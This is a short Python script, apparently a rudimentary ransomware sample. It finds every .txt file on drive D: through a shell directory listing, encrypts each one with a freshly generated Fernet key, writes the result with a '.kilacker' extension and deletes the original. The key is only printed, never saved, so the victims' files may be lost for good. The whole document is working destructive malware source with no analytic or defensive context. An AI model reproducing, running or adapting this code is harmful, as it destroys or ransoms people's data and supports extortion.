import os

from subprocess import check_output
from cryptography.fernet import Fernet

key = Fernet.generate_key()

print(key)

key2 = Fernet(key)

fille = check_output("D: && dir /S /B *txt",shell=True).decode().split()

for fileasli in fille:
    dirlist = open(fileasli,"rb")#rb = ready binary
    data = dirlist.read()
    encdata = key2.encrypt(data)
    new_file = open(fileasli+".kilacker","wb")
    new_file.write(encdata)
    new_file.close()
    dirlist.close()
    os.remove(fileasli)
print(fileasli)